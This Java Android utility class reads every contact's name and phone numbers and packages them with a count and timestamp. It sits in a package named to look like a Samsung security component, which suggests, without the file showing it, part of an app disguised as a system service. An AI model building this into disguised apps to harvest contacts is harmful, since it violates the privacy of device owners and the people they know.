package com.samsung.android.security.v8.utils;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.ContactsContract;

import androidx.core.app.ActivityCompat;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class ContactsUtil {
    
    public static Map<String, Object> getAllContacts(Context context) {
        Map<String, Object> result = new HashMap<>();
        
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) 
                != PackageManager.PERMISSION_GRANTED) {
            result.put("error", "Contacts permission not granted");
            return result;
        }
        
        List<Map<String, Object>> contactsList = new ArrayList<>();
        
        try {
            Cursor cursor = context.getContentResolver().query(
                    ContactsContract.Contacts.CONTENT_URI,
                    null, null, null,
                    ContactsContract.Contacts.DISPLAY_NAME + " ASC"
            );
            
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    Map<String, Object> contact = new HashMap<>();
                    
                    int idIndex = cursor.getColumnIndex(ContactsContract.Contacts._ID);
                    int nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
                    int hasPhoneIndex = cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER);
                    
                    if (idIndex >= 0 && nameIndex >= 0 && hasPhoneIndex >= 0) {
                        String contactId = cursor.getString(idIndex);
                        String name = cursor.getString(nameIndex);
                        int hasPhone = cursor.getInt(hasPhoneIndex);
                        
                        contact.put("id", contactId);
                        contact.put("name", name);
                        
                        if (hasPhone > 0) {
                            List<String> phones = getPhoneNumbers(context, contactId);
                            contact.put("phones", phones);
                        }
                        
                        contactsList.add(contact);
                    }
                }
                cursor.close();
            }
            
            result.put("contacts", contactsList);
            result.put("count", contactsList.size());
            result.put("timestamp", System.currentTimeMillis());
            
        } catch (Exception e) {
            result.put("error", e.getMessage());
        }
        
        return result;
    }
    
    private static List<String> getPhoneNumbers(Context context, String contactId) {
        List<String> phones = new ArrayList<>();
        
        try {
            Cursor phoneCursor = context.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                    new String[]{contactId},
                    null
            );
            
            if (phoneCursor != null) {
                while (phoneCursor.moveToNext()) {
                    int phoneIndex = phoneCursor.getColumnIndex(
                            ContactsContract.CommonDataKinds.Phone.NUMBER
                    );
                    if (phoneIndex >= 0) {
                        String phoneNumber = phoneCursor.getString(phoneIndex);
                        phones.add(phoneNumber);
                    }
                }
                phoneCursor.close();
            }
        } catch (Exception e) {
            // Ignore
        }
        
        return phones;
    }
}
